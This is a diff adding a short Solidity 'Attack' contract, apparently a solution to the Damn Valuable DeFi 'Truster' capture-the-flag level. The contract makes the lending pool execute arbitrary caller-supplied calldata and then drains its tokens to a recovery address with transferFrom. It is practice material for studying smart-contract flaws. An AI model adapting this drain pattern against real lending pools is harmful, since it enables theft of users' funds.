@@ -1,0 +1,31 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.25;
+import {DamnValuableToken} from "../DamnValuableToken.sol";
+import {TrusterLenderPool} from "./TrusterLenderPool.sol";
+
+contract Attack {
+
+    DamnValuableToken public immutable token;
+    TrusterLenderPool public immutable pool;
+    address public recovery;
+
+    constructor( DamnValuableToken _token, TrusterLenderPool _pool, address _recovery ) {
+        token = _token;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack( bytes memory data, uint256 amount ) external {
+
+        ( bool success, bytes memory returnData ) = address(pool).call( data );
+        if ( !success )
+        {
+            if ( returnData.length == 0 )
+                revert("RevertInDelegate");
+        }
+        token.transferFrom( address(pool), recovery, amount);
+    }
+
+
+}
